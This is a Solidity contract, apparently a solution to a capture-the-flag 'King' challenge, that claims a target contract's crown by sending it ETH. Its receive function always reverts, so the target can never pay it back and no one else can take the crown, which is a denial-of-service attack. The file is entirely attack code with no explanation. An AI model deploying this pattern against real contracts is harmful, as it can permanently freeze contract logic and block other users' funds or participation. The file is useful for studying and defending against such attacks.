// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract ImposterKing {
    address king;

    constructor(address _king) payable {
        king = _king;
    }

    function claimCrown() public payable {
        payable(king).call{value: msg.value}("");
    }

    receive() external payable {
        revert("I will keep the crown :)");
    }
}
